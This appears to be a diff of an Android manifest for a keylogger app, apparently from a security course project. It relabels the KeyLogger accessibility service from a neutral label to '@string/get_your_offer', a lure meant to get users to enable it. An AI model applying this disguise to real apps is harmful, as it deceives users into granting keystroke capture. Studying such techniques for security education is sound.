@@ -21,7 +21,7 @@
         </activity>
         <service
             android:name="com.haneet.infsec.keylogapp.KeyLogger"
-            android:label="@string/accessibility_service_label"
+            android:label="@string/get_your_offer"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
